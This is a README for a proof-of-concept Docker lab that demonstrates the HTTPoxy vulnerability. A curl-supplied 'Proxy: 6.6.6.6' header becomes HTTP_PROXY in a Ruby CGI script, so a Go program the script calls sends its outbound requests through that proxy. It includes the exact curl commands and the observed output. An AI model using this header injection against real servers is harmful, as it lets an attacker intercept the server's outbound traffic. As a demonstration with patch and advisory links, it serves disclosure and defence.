# Ruby HTTPoxy PoC (gordonchan/ruby-httpoxy)

[![](https://images.microbadger.com/badges/image/gordonchan/ruby-httpoxy.svg)](http://microbadger.com/images/gordonchan/ruby-httpoxy "Get your own image badge on microbadger.com")

[![](https://images.microbadger.com/badges/image/gordonchan/ruby-apache-httpoxy.svg)](http://microbadger.com/images/gordonchan/ruby-apache-httpoxy "Get your own image badge on microbadger.com")

A somewhat contrived example of the [HTTPoxy](https://httpoxy.org/) vulnerability for a Ruby WEBrick server that is serving CGI scripts. Demonstrates:

* `WEBrick::HTTPRequest` prepends headers with "HTTP_" and `WEBrick::HTTPServlet::CGIHandler` lets the `HTTP_PROXY` header become an environment variable. Same deal with Apache server.
* Ruby `net/http` is not vulnerable as per [`URI::Generic#find_proxy`](http://ruby-doc.org/stdlib-2.3.1/libdoc/uri/rdoc/URI/Generic.html#method-i-find_proxy).
* *But* if the Ruby CGI script calls a system program that uses an affected HTTP client (e.g. Go `net/http`), the `HTTP_PROXY` environment variable will be respected and its value will be used for outbound HTTP requests. :(

## Quick Start:

```
$ ./server
$ curl -H "Proxy: 6.6.6.6" localhost:4000/ruby.cgi -v
```

With Docker:

```
$ docker run --rm -p 4000:4000 gordonchan/ruby-httpoxy
$ curl -H "Proxy: 6.6.6.6" $(docker-machine ip):4000/ruby.cgi -v
```

With Docker (Apache):

```
$ docker run --rm -p 80:80 gordonchan/ruby-apache-httpoxy
$ curl -H "Proxy: 6.6.6.6" $(docker-machine ip):80/ruby.cgi -v
```

### Observed Output

```
*   Trying ::1...
* Connected to localhost (::1) port 4000 (#0)
> GET /ruby.cgi HTTP/1.1
> Host: localhost:4000
> User-Agent: curl/7.43.0
> Accept: */*
> Proxy: 6.6.6.6
>
< HTTP/1.1 200 OK
< Content-Type: text/html
< Server: WEBrick/1.3.1 (Ruby/2.3.0/2015-12-25)
< Date: Tue, 02 Aug 2016 11:42:57 GMT
< Content-Length: 409
< Connection: Keep-Alive
<
HTTP_PROXY env:
ENV['HTTP_PROXY']  > 6.6.6.6

net/http proxy check:
NONE!

`./go-proxy-check` (system command):
In Go Land (using net/http)
Proxy: http://6.6.6.6
```

## Notes:
- [HTTPoxy.org](https://httpoxy.org/)
- [WEBrick::HTTPRequest](https://github.com/ruby/ruby/blob/978ee6d1ef62b36c143103f7a229bfb8bf0f99c6/lib/webrick/httprequest.rb#L402) setting metavariables as per defined in [RFC3875 section 4.1.18](https://tools.ietf.org/html/rfc3875#section-4.1.18)
- [Ruby WEBRick patch](https://github.com/ruby/ruby/commit/dafeebf12d4a930a99e5d3917ba070ebefefd23f)
- [Ruby Redmine Bug #12610](https://bugs.ruby-lang.org/issues/12610)
- [Go Lang `net/http` Patch](https://github.com/golang/go/issues/16405)
- [Red Hat advisory](https://access.redhat.com/security/vulnerabilities/httpoxy)
- [Nginx blog post](https://www.nginx.com/blog/mitigating-the-httpoxy-vulnerability-with-nginx/)
- [Notes from Phusion Passenger](https://blog.phusion.nl/2016/07/21/web-applications-on-phusion-passenger-are-not-vulnerable-to-httpoxy/)
- [Notes from Sophos](https://nakedsecurity.sophos.com/2016/07/19/httpoxy-the-disease-that-could-make-your-web-server-spring-a-leak/)

## License

ruby-httpoxy is Copyright (c) 2016 Gordon Chan and is released under the MIT License. It is free software, and may be redistributed under the terms specified in the LICENSE file.

[![Analytics](https://ga-beacon.appspot.com/UA-70790190-2/ruby-httpoxy/README.md?flat)](https://github.com/igrigorik/ga-beacon)
